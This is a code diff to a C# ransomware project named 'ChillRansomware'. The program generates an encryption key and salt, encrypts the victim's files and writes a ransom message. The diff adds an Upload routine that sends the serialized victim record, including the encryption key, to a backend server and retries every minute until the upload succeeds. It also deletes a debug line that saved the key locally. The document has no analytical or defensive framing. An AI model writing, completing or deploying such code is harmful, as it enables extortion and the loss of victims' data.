@@ -19,8 +19,8 @@ namespace ChillRansomware
             if (Settings.DebugMode)
                 File.WriteAllText("info.json", JsonConvert.SerializeObject(user));
 
+            Upload();
 
-            //TODO: Add upload to server here
             Encryption.StartEncryption(user.ransomInfo.EncryptionKey, user.ransomInfo.Salt);
 
             CreateMessage();
@@ -35,7 +35,6 @@ namespace ChillRansomware
                 {
                     user.ransomInfo.EncryptionKey = Utils.RandomString(Settings.KeyLength);
                     user.ransomInfo.Salt = Utils.RandomSaltBytes();
-                    File.AppendAllText("AAAA.txt", user.ransomInfo.EncryptionKey);
                 }
                 else
                 {
@@ -55,7 +54,20 @@ namespace ChillRansomware
                 } while (HasInternet == false);
             }
         }
-
+        private static void Upload()
+        {
+            Upload:
+            try
+            {
+                UploadData.PostUpload(JsonConvert.SerializeObject(user), $"{Settings.BackendUrl}/upload");
+            }
+            catch
+            {
+                GC.Collect(0);
+                Thread.Sleep(60000);
+                goto Upload;
+            }
+        }
         static void CreateMessage()
         {
             if (!File.Exists(Settings.MessagePath))
